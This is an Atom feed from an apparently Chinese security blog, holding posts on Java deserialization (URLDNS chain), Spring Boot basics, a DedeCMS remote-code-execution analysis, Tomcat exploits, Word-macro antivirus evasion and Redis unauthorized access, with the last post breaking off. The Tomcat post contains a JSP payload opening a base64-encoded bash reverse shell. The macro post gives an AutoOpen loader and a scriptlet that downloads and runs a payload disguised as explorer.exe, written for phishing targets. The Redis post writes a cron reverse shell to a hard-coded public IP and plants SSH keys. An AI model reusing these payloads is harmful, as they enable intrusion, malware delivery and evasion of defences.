<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://www.yyxyy.xyz/</id>
    <title>Yyx</title>
    <updated>2023-03-19T08:03:57.115Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://www.yyxyy.xyz/"/>
    <link rel="self" href="https://www.yyxyy.xyz/atom.xml"/>
    <subtitle>&lt;marquee&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://api.xygeng.cn/one/get/&quot;&gt;&lt;/script&gt;&lt;/marquee&gt;</subtitle>
    <logo>https://www.yyxyy.xyz/images/avatar.png</logo>
    <icon>https://www.yyxyy.xyz/favicon.ico</icon>
    <rights>All rights reserved 2023, Yyx</rights>
    <entry>
        <title type="html"><![CDATA[JAVA序列化与反序列化]]></title>
        <id>https://www.yyxyy.xyz/post/java-xu-lie-hua-yu-fan-xu-lie-hua/</id>
        <link href="https://www.yyxyy.xyz/post/java-xu-lie-hua-yu-fan-xu-lie-hua/">
        </link>
        <updated>2022-03-03T03:09:54.000Z</updated>
        <content type="html"><![CDATA[<h1 id="概述">概述</h1>
<p>大概意思：</p>
<pre><code class="language-c">序列化：对象 -&gt; 字符串
反序列化：字符串 -&gt; 对象
</code></pre>
<h1 id="几种创建的序列化和反序列化协议">几种创建的序列化和反序列化协议</h1>
<ul>
<li>XML&amp;SOAP</li>
<li>JSON</li>
<li>Protobuf</li>
</ul>
<h1 id="序列化与反序列化基本实现">序列化与反序列化基本实现</h1>
<p>将序列化功能封装进了 <strong>serialize</strong> 这个方法里面，在序列化当中，我们通过这个 FileOutputStream 输出流对象，将序列化的对象输出到 ser.bin 当中。再调用 oos 的 writeObject 方法，将对象进行序列化操作。</p>
<h2 id="serialization"><strong>Serialization</strong></h2>
<pre><code class="language-java">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
oos.writeObject(obj);
</code></pre>
<h2 id="unserialize"><strong>Unserialize</strong></h2>
<pre><code class="language-java">ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
Object obj = ois.readObject();
</code></pre>
<h1 id="序列化的安全问题">序列化的安全问题</h1>
<h2 id="重要函数">重要函数</h2>
<p>writeObject 和 readObject</p>
<h2 id="存在安全漏洞的形式">存在安全漏洞的形式</h2>
<h3 id="0x01-入口类的-readobject-直接调用危险方法">0x01 入口类的 readObject 直接调用危险方法</h3>
<h3 id="0x02-入口参数中包含可控类该类有危险方法readobject-时调用">0x02 入口参数中包含可控类，该类有危险方法，readObject 时调用</h3>
<h3 id="0x03-入口类参数中包含可控类该类又调用其他有危险方法的类readobject-时调用">0x03 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject 时调用</h3>
<h3 id="0x04-构造函数静态代码块等类加载时隐式执行">0x04 构造函数/静态代码块等类加载时隐式执行</h3>
<h2 id="漏洞的攻击路线">漏洞的攻击路线</h2>
<p>首先的攻击前提：继承 Serializable</p>
<p>入口类：source （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个类作为参数；最好 jdk 自带）</p>
<p>找到入口类之后要找调用链 gadget chain 相同名称、相同类型</p>
<p>执行类 sink （RCE SSRF 写文件等等）比如 exec 这种函数</p>
<h1 id="urldns-分析">URLDNS 分析</h1>
<p>urldns 地址</p>
<p>https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</p>
<p>利用链</p>
<pre><code class="language-java">Gadget Chain:     
    HashMap.readObject()         
    	HashMap.putVal()             
    		HashMap.hash()                 
    			URL.hashCode()
</code></pre>
<p>先看 Hashmap 的readobject方法</p>
<pre><code class="language-java">//还有一堆省略了
for (int i = 0; i &lt; mappings; i++) {
    @SuppressWarnings(&quot;unchecked&quot;)
        K key = (K) s.readObject();
    @SuppressWarnings(&quot;unchecked&quot;)
        V value = (V) s.readObject();
    putVal(hash(key), key, value, false, false);
}
</code></pre>
<p>跟进hash函数</p>
<pre><code class="language-plain">static final int hash(Object key) {
    int h;
    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);
}
</code></pre>
<p>这里使用的是key.hashcode。于是需要寻找key来源。</p>
<p>在POC里面URL需要使用hashmap.put()方法，</p>
<pre><code class="language-java">hashmap.put(new URL(&quot;DNS地址以&quot;),1);
</code></pre>
<p>跟进put方法。</p>
<pre><code class="language-plain">public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
</code></pre>
<p>发现调用了hash函数，hash里面的key便是传的URL参数。</p>
<p>跟进URL里面查找hashcode().</p>
<pre><code class="language-java">public synchronized int hashCode() {
    if (hashCode != -1)
        return hashCode;

    hashCode = handler.hashCode(this);
    return hashCode;
}
</code></pre>
<p>继续跟进handler。</p>
<pre><code class="language-java">transient URLStreamHandler handler;
</code></pre>
<p>继续跟进URLStreamHandler，寻找hashcode。</p>
<pre><code class="language-java">protected int hashCode(URL u) {
    int h = 0;

// Generate the protocol part.
String protocol = u.getProtocol();
if (protocol != null)
    h += protocol.hashCode();

// Generate the host part.
InetAddress addr = getHostAddress(u);
if (addr != null) {
    h += addr.hashCode();
} else {
    String host = u.getHost();
    if (host != null)
        h += host.toLowerCase().hashCode();
}
</code></pre>
<p>继续跟进hostAddress()</p>
<pre><code class="language-plain">protected InetAddress getHostAddress(URL u) {
    return u.getHostAddress();
}
</code></pre>
<p>继续跟进</p>
<pre><code class="language-plain">synchronized InetAddress getHostAddress() {
    if (hostAddress != null) {
        return hostAddress;
    }

    if (host == null || host.isEmpty()) {
        return null;
    }
    try {
        hostAddress = InetAddress.getByName(host);
    } catch (UnknownHostException | SecurityException ex) {
        return null;
    }
    return hostAddress;
}
</code></pre>
<p>这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询。到这⾥就不必要再跟了。</p>
<h2 id="利用链">利用链</h2>
<ol>
<li>HashMap-&gt;readObject()</li>
<li>HashMap-&gt;hash()</li>
<li>URL-&gt;hashCode()</li>
<li>URLStreamHandler-&gt;hashCode()</li>
<li>URLStreamHandler-&gt;getHostAddress()</li>
<li>InetAddress-&gt;getByName()</li>
</ol>
<h2 id="urldns-反序列化利用链的-poc">URLDNS 反序列化利用链的 POC</h2>
<pre><code class="language-plain">package org.example;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL; import java.util.HashMap;
public class URLDNS {
    public static void main(String[] args) throws Exception {
        // new一个 HashMap 出来，这是此 gadget 的起点；
        // 然后设置需要访问的url
        HashMap hashMap = new HashMap();
        URL url = new URL(&quot;http://aer4rt.dnslog.cn&quot;);
        // 将私有的 hashCode 设置为可以更改
        Field field = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);
        field.setAccessible(true);
        // 设置 url 对象内的 hashCode 为 0x123
        field.set(url, 0x123);
        // 将键值存入hashMap
        hashMap.put(url, &quot;qqq&quot;);
        // 设置 url 对象内的 hashCode 为 -1（不可更改）
        field.set(url, -1);
        // 序列化，写入文件
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./out.ser&quot;));
        outputStream.writeObject(hashMap);
        outputStream.close();
        // 反序列化，读取文件
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./out.ser&quot;));
        inputStream.readObject();
        inputStream.close();
    }
}
</code></pre>
<h2 id="注意">注意</h2>
<p>我们需要注意hashmap中的put方法。</p>
<pre><code class="language-java">public V put(K key, V value) {
    return putVal(hash(key), key, value, false, true);
}
</code></pre>
<p>在URL对象再初始化之后的hashCode默认为-1。也就是说生成payload的过程中，如果不做任何修改就直接把URL对象放入HashMap是在本地触发一次DNS查询的。</p>
<p>注释field.set(url, 0x123);发现默认为-1</p>
<p><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/image.png" alt="img" loading="lazy"><br>
这时候hashCode默认为-1，然后就会进入hash(key)触发DNS查询。这就会混淆是你本地的查询还是对方机器的查询的DNS。在put之前修改个hashCode，就可以避免触发。</p>
<p>而在put了之后，需要field.set(url, -1);把这个字段修改回来，去触发DNS请求。</p>
<h2 id="查看yso做法">查看yso做法</h2>
<pre><code class="language-java">public class URLDNS implements ObjectPayload&lt;Object&gt; { 
    public Object getObject(final String url) throws Exception { 
        //Avoid DNS resolution during payload creation 
        //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload. 
        URLStreamHandler handler = new SilentURLStreamHandler(); 
        HashMap ht = new HashMap(); 
        // HashMap that will contain the URL 
        URL u = new URL(null, url, handler); // URL to use as the Key 
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. 
        Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. 
        return ht; 
    } 
    public static void main(final String[] args) throws Exception { 
        PayloadRunner.run(URLDNS.class, args); 
    } 
    static class SilentURLStreamHandler extends URLStreamHandler { 
        protected URLConnection openConnection(URL u) throws IOException { 
            return null; 
        } 
        protected synchronized InetAddress getHostAddress(URL u) { 
            return null; 
        } 
    } 
}
</code></pre>
<p>它代码中没有使用 field.set(url, 0x123); ，但是自定了一个类为 SilentURLStreamHandler，这个类重写了getHostAddress() 函数，重写后的 getHostAddress() 是个空的，也就导致在本地生成 poc 的时候不会有 DNS 请求。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Springboot 学习]]></title>
        <id>https://www.yyxyy.xyz/post/springboot-xue-xi/</id>
        <link href="https://www.yyxyy.xyz/post/springboot-xue-xi/">
        </link>
        <updated>2022-02-19T07:02:49.000Z</updated>
        <content type="html"><![CDATA[<p>环境<br>
● jdk1.8<br>
● maven 3.6.1<br>
● springboot 2.7.8<br>
● IDEA 2022<br>
HelloWorld程序<br>
0x01 idea快速配置springboot<br>
0x02 起步依赖</p>
<pre><code class="language-java">&lt;parent&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
    &lt;version&gt;2.7.8&lt;/version&gt;
    &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
&lt;/parent&gt;


&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
    &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
<p>0x03 启动引导类</p>
<pre><code class="language-java">@SpringBootApplication
    public class DemoApplication {

        public static void main(String[] args) {
            SpringApplication.run(DemoApplication.class, args);
        }

    }
</code></pre>
<p>0x04 业务类</p>
<pre><code class="language-java">@RestController
    public class HelloController {
        @RequestMapping(&quot;/hello&quot;)
        public String hello(){
            return &quot;hello&quot;;
        }
    }
</code></pre>
<p>配置文件<br>
0x01 application.properties配置格式<br>
1 properties</p>
<pre><code class="language-yaml">server.port=8080
</code></pre>
<p>2 yml</p>
<pre><code class="language-yaml">server:
    port: 8080
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[DeDe远程代码执行分析&复现]]></title>
        <id>https://www.yyxyy.xyz/post/dede-yuan-cheng-dai-ma-zhi-xing-fen-xi-andfu-xian/</id>
        <link href="https://www.yyxyy.xyz/post/dede-yuan-cheng-dai-ma-zhi-xing-fen-xi-andfu-xian/">
        </link>
        <updated>2021-10-09T09:09:09.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-安装dedecms">0x01 安装dedecms</h1>
<p>dedecms安装链接:</p>
<pre><code class="language-html">https://github.com/dedecms/DedeCMS/releases/tag/v5.8.1
</code></pre>
<h1 id="0x02-漏洞分析">0x02 漏洞分析</h1>
<p>1.plus/flink.php脚本内部</p>
<pre><code class="language-php">if ($dopost == 'save') {
    $validate = isset($validate) ? strtolower(trim($validate)) : '';
    $svali = GetCkVdValue();
    if ($validate == '' || $validate != $svali) {
        ShowMsg('验证码不正确!', '-1');
        exit();
    }
}
</code></pre>
<p>这里调用了ShowMsg(),跟进这个函数</p>
<p>2.include/common.func.php</p>
<pre><code class="language-php">function ShowMsg($msg, $gourl, $onlymsg = 0, $limittime = 0)
{
​    if (empty($GLOBALS['cfg_plus_dir'])) {
​        $GLOBALS['cfg_plus_dir'] = '..';
​    }
​    if ($gourl == -1) {
​        $gourl = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
​        if ($gourl == &quot;&quot;) {
​            $gourl = -1;
​        }
​    }
    ...............................................................
        
​    $tpl = new DedeTemplate();
​    $tpl-&gt;LoadString($msg);
​    $tpl-&gt;Display();
}
</code></pre>
<p>首先当<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>g</mi><mi>o</mi><mi>u</mi><mi>r</mi><mi>l</mi><mo>=</mo><mo>−</mo><mn>1</mn><mi mathvariant="normal">时</mi><mi mathvariant="normal">，</mi><mi>H</mi><mi>T</mi><mi>T</mi><msub><mi>P</mi><mi>R</mi></msub><mi>E</mi><mi>F</mi><mi>E</mi><mi>R</mi><mi>E</mi><mi>R</mi><mi mathvariant="normal">时</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">续</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">在</mi><mi>L</mi><mi>o</mi><mi>a</mi><mi>d</mi><mi>S</mi><mi>t</mi><mi>r</mi><mi>i</mi><mi>n</mi><mi>g</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">gourl=-1时，HTTP_REFERER时可控的，后续会在LoadString(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mord">1</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">续</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">在</span><span class="mord mathdefault">L</span><span class="mord mathdefault">o</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span></span></span></span>msg)加载，在Display()调用解析。</p>
<p>3.include/dedetemplate.class.php</p>
<pre><code class="language-php">public function LoadString($str = '')
{
    $this-&gt;sourceString = $str;
    $hashcode = md5($this-&gt;sourceString);
    $this-&gt;cacheFile = $this-&gt;cacheDir . &quot;/string_&quot; . $hashcode . &quot;.inc&quot;;
    $this-&gt;configFile = $this-&gt;cacheDir . &quot;/string_&quot; . $hashcode . &quot;_config.inc&quot;;
    $this-&gt;ParseTemplate();
}

</code></pre>
<pre><code class="language-php">public function Display()
{
    global $gtmpfile;
    extract($GLOBALS, EXTR_SKIP);
    $this-&gt;WriteCache();
    include $this-&gt;cacheFile;
}
</code></pre>
<p><code>sourceString</code>设置与攻击者控制的<code>$msg</code>会在writeCache被调用。</p>
<p>跟进WriteCache()</p>
<pre><code class="language-php">public function WriteCache($ctype = 'all')
​    {
​        if (!file_exists($this-&gt;cacheFile) || $this-&gt;isCache == false
​            || (file_exists($this-&gt;templateFile) &amp;&amp; (filemtime($this-&gt;templateFile) &gt; filemtime($this-&gt;cacheFile)))
​        ) {
​            if (!$this-&gt;isParse) {
​                $this-&gt;ParseTemplate();
​            }
​            $fp = fopen($this-&gt;cacheFile, 'w') or dir(&quot;Write Cache File Error! &quot;);
​            flock($fp, 3);
​            $result = trim($this-&gt;GetResult());
​            $errmsg = '';
​            //var_dump($result);exit();
​            if (!$this-&gt;CheckDisabledFunctions($result, $errmsg)) {
​                fclose($fp);
​                @unlink($this-&gt;cacheFile);
​                die($errmsg);
​         }
​     fwrite($fp, $result);
​     fclose($fp);
    .........
}
</code></pre>
<pre><code class="language-php">public function GetResult()
{
​    if (!$this-&gt;isParse) {
​        $this-&gt;ParseTemplate();
​    }
​    $addset = '';
​    $addset .= '&lt;' . '?php' . &quot;\r\n&quot; . 'if(!isset($GLOBALS[\'_vars\'])) $GLOBALS[\'_vars\'] = array(); ' . &quot;\r\n&quot; . '$fields = array();' . &quot;\r\n&quot; . '?' . '&gt;';
​    return preg_replace(&quot;/\?&quot; . &quot;&gt;[ \r\n\t]{0,}&lt;&quot; . &quot;\?php/&quot;, &quot;&quot;, $addset . $this-&gt;sourceString);
}
</code></pre>
<p>调用<code>GetResult</code>返回值<code>sourceString</code>来设置<code>$result</code>变量，该变量现在包含攻击者控制的输入。然后在<code>CheckDisabledFunctions</code>函数在<code>$result</code>变量上被调用</p>
<pre><code class="language-php">public function CheckDisabledFunctions($str, &amp;$errmsg = '')
{
    global $cfg_disable_funs;
    $cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite';
// 模板引擎增加disable_functions
    if (!defined('DEDEDISFUN')) {
        $tokens = token_get_all_nl($str);
        $disabled_functions = explode(',', $cfg_disable_funs);
        foreach ($tokens as $token) {
            if (is_array($token)) {
                if ($token[0] = '306' &amp;&amp; in_array($token[1], $disabled_functions)) {
                    $errmsg = 'DedeCMS Error:function disabled &quot;' . $token[1] . '&quot; &lt;a href=&quot;http://help.dedecms.com/install-use/apply/2013/0711/2324.html&quot; target=&quot;_blank&quot;&gt;more...&lt;/a&gt;';
                    return false;
                }
            }
        }
    }
    return true;
}
</code></pre>
<p>GetResult()方法执行后返回结果通过CheckDisabledFunctions过滤，然后经过include $this-&gt;cacheFile;</p>
<p>到这儿就可以通过控制 Referer请求头，来控制模版的渲染，绕过 CheckDisabledFunctions()方法的过滤 造成远程命令执行</p>
<p>通过正则找到受影响且无需身份认证的文件，来进行命令执行</p>
<ol>
<li><code>/plus/flink.php?dopost=save</code></li>
<li><code>/plus/users_products.php?oid=1337</code></li>
<li><code>/plus/download.php?aid=1337</code></li>
<li><code>/plus/showphoto.php?aid=1337</code></li>
<li><code>/plus/users-do.php?fmdo=sendMail</code></li>
<li><code>/plus/posttocar.php?id=1337</code></li>
<li><code>/plus/vote.php?dopost=view</code></li>
<li><code>/plus/carbuyaction.php?do=clickout</code></li>
<li><code>/plus/recommend.php</code></li>
<li>…</li>
</ol>
<h1 id="0x03-漏洞复现">0x03 漏洞复现</h1>
<p>这里我发现没有禁止反引号，就直接拿反引号执行命令</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/web/1633766116159.png" alt="1633766116159" loading="lazy"></figure>
<h1 id="0x04-参考链接">0x04 参考链接</h1>
<p>https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[tomcat漏洞总结]]></title>
        <id>https://www.yyxyy.xyz/post/tomcat-lou-dong-zong-jie/</id>
        <link href="https://www.yyxyy.xyz/post/tomcat-lou-dong-zong-jie/">
        </link>
        <updated>2021-08-30T02:12:40.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-cve-2017-12615">0x01 CVE-2017-12615</h1>
<p>CVE-2017-12615对应的漏洞为任意文件写入，主要影响的是Tomcat的7.0.0-7.0.81这几个版本</p>
<p>流程：</p>
<p>抓包，修改为put请求就行。</p>
<pre><code class="language-sql">PUT /test.txt HTTP/1.1

testpoc
</code></pre>
<p>响应包为201表示成功</p>
<p>同理可以上传冰蝎马这些东西</p>
<p>上传这里可能会404，所以需要绕过</p>
<pre><code class="language-powershell">1.Windows下不允许文件以空格结尾
以PUT /test.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格

2.Windows NTFS流
Put/test.jsp::$DATA HTTP/1.1

3./在文件名中是非法的，也会被去除（Linux/Windows）
Put/test.jsp/ Http:/1.1

</code></pre>
<h1 id="0x02-cve-2020-1938">0x02 CVE-2020-1938</h1>
<p>漏洞复现</p>
<p>我复现了一下，感觉这个洞比较鸡肋</p>
<p>首先寻找poc</p>
<pre><code class="language-shell">git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python CNVD-2020-10487-Tomcat-Ajp-lfi.py    #py2环境

查看文件
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.1.8 -p 8009 -f /WEB-INF/web.xml

反弹shell
生成一个test.txt
&lt;%
    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}&quot;).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print(&quot;&lt;pre&gt;&quot;);
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print(&quot;&lt;/pre&gt;&quot;);
%&gt;
然后想办法把txt传入服务器。
监听端口
使用poc反弹shell
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 192.168.180.139 -p 8009 -f test.txt

也可以使用msf，这里就不细说了，反正感觉有点鸡肋

</code></pre>
<h1 id="0x03-cve-2019-0232">0x03 CVE-2019-0232</h1>
<p>2333</p>
<h1 id="0x04-弱口令war包部署">0x04  弱口令＋war包部署</h1>
<p>这个洞是tomcat最好用的</p>
<h1 id="0x05-暴力破解">0x05 暴力破解</h1>
<p>可以使用msf的模块 ：auxiliary/scanner/http/tomcat_mgr_login</p>
<p>也可以使用burp抓包</p>
<p>参考链接：https://xz.aliyun.com/t/10083#toc-10</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[word宏免杀]]></title>
        <id>https://www.yyxyy.xyz/post/word-hong-mian-sha/</id>
        <link href="https://www.yyxyy.xyz/post/word-hong-mian-sha/">
        </link>
        <updated>2021-08-25T07:02:14.000Z</updated>
        <content type="html"><![CDATA[<h1 id="写在前面">写在前面</h1>
<p>仅仅是为了娱乐。</p>
<h1 id="知识点">知识点</h1>
<ol>
<li>宏代码,不执行regsvr32命令 远程调用sct文件,实现免杀</li>
<li>csharp 可执行js ,反序列化加载</li>
</ol>
<p>具体的原理：</p>
<p>利用宏调用Dlllnstall api</p>
<pre><code class="language-vbscript">Private Declare PtrSafe Function DllInstall Lib &quot;scrobj.dll&quot; (ByVal bInstall As Boolean, ByRef pszCmdLine As Any) As Long

Sub AutoOpen()
        DllInstall False, ByVal StrPtr(&quot;ip/y.sct&quot;) ' False = &quot;Don't install&quot;
End Sub
</code></pre>
<h1 id="后续操作">后续操作</h1>
<h2 id="0x01-远程部署一个sct">0x01 远程部署一个sct</h2>
<p>例如：弹个计算器</p>
<pre><code class="language-vbscript">&lt;?XML version=&quot;1.0&quot;?&gt;
&lt;scriptlet&gt;
&lt;registration
  progid=&quot;TESTING&quot;
  classid=&quot;{A1112221-0000-0000-3000-000DA00DABFC}&quot; &gt;
  &lt;script language=&quot;JScript&quot;&gt;
    &lt;![CDATA[
var foo = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);
    ]]&gt;
&lt;/script&gt;
&lt;/registration&gt;
&lt;/scriptlet&gt;
</code></pre>
<p>后续只需要使用word宏远程加载这个sct文件就成。</p>
<h2 id="0x02-免杀">0x02 免杀</h2>
<p>操作和前面一样。</p>
<pre><code class="language-vbscript">&lt;?XML version=&quot;1.0&quot;?&gt;
&lt;scriptlet&gt;
&lt;registration
    progid=&quot;ShortJSRAT&quot;
    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
    &lt;!-- Learn from Casey Smith @subTee --&gt;
    &lt;script language=&quot;JScript&quot;&gt;
        &lt;![CDATA[
            var WSHShell = new ActiveXObject(&quot;WScript.Shell&quot;);
            path = WSHShell.ExpandEnvironmentStrings(&quot;%temp%&quot;);
            var filepath = path+&quot;/explorer.exe&quot;;
            var xhr = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);
            xhr.open(&quot;GET&quot;,&quot;免杀马&quot;, false);
            xhr.send();
            if (xhr.Status == 200) {
                var fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);
                var stream = new ActiveXObject(&quot;ADODB.Stream&quot;);
                stream.Open();
                stream.Type = 1;
                stream.Write(xhr.ResponseBody);
                stream.Position = 0;
                if (fso.FileExists(filepath)){
                   fso.DeleteFile(filepath);
                }
                stream.SaveToFile(filepath);
                stream.Close();
                new ActiveXObject(&quot;WScript.Shell&quot;).Exec(filepath);
            }
 
 
        ]]&gt;
&lt;/script&gt;
&lt;/registration&gt;
&lt;/scriptlet&gt;
</code></pre>
<h2 id="0x03-对word的一些处理">0x03 对word的一些处理</h2>
<p>后续会思考如何才能让目标打开宏，怎么样才能更加逼真</p>
<h1 id="0x04-总结">0x04 总结</h1>
<p>感谢愿意陪我玩的朋友。</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/bapass/1.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Redis未授权利用及思考]]></title>
        <id>https://www.yyxyy.xyz/post/redis-wei-shou-quan-li-yong-ji-si-kao/</id>
        <link href="https://www.yyxyy.xyz/post/redis-wei-shou-quan-li-yong-ji-si-kao/">
        </link>
        <updated>2021-08-23T14:02:37.000Z</updated>
        <content type="html"><![CDATA[<h1 id="redis几种基本拿shell的方法">redis几种基本拿shell的方法</h1>
<h2 id="0x01-计划任务执行命令反弹shell">0x01 计划任务执行命令反弹shell</h2>
<pre><code class="language-shell">set xxx &quot;\n\n* * * * * bash -i&gt;&amp; /dev/tcp/104.168.147.13/8888 0&gt;&amp;1\n\n&quot;
config set dir /var/spool/cron
config set dbfilename root
save
</code></pre>
<h2 id="0x02-写web目录">0x02 写web目录</h2>
<pre><code class="language-shell">config set dir /tmp/   这里应该是web目录
config set dbfilename test.php
set 1 &quot;&lt;?= phpinfo(); ?&gt;&quot;
save
</code></pre>
<h2 id="0x03-写ssh-key">0x03 写SSH key</h2>
<pre><code class="language-shell">ssh-key -t rsa#然后按照next执行就行了
(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; test.txt
cat test.txt |redis-cli -h 192.168.0.109 -a 123456 -x set crackit
redis执行
config set dir /root/.ssh
config set dbfilename authorized_keys
save
</code></pre>
<h2 id="0x04-主从复制">0x04 主从复制</h2>
<p>https://github.com/vulhub/redis-rogue-getshell</p>
<p>https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</p>
<h1 id="redis-在win下面的利用及思考">redis 在win下面的利用及思考</h1>
<h2 id="网上常见的方法">网上常见的方法</h2>
<p>1.web目录写马</p>
<p>2.写启动项</p>
<p>https://www.bilibili.com/read/cv7358287/</p>
<p>https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</p>
<h2 id="一些其它的方法">一些其它的方法</h2>
<p>1.dll劫持</p>
<p>2.覆写一些文件，让用户点击。</p>
<p>3.覆写sethc.exe。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Flask ssti 漏洞复现]]></title>
        <id>https://www.yyxyy.xyz/post/flask-ssti-lou-dong-fu-xian/</id>
        <link href="https://www.yyxyy.xyz/post/flask-ssti-lou-dong-fu-xian/">
        </link>
        <updated>2021-06-09T08:01:44.000Z</updated>
        <content type="html"><![CDATA[<h4 id="flask-ssti-漏洞复现">Flask ssti 漏洞复现</h4>
<h6 id="环境">环境</h6>
<p>使用vulhub里面的flask/ssti环境</p>
<h6 id="查看源码发现漏洞处">查看源码，发现漏洞处</h6>
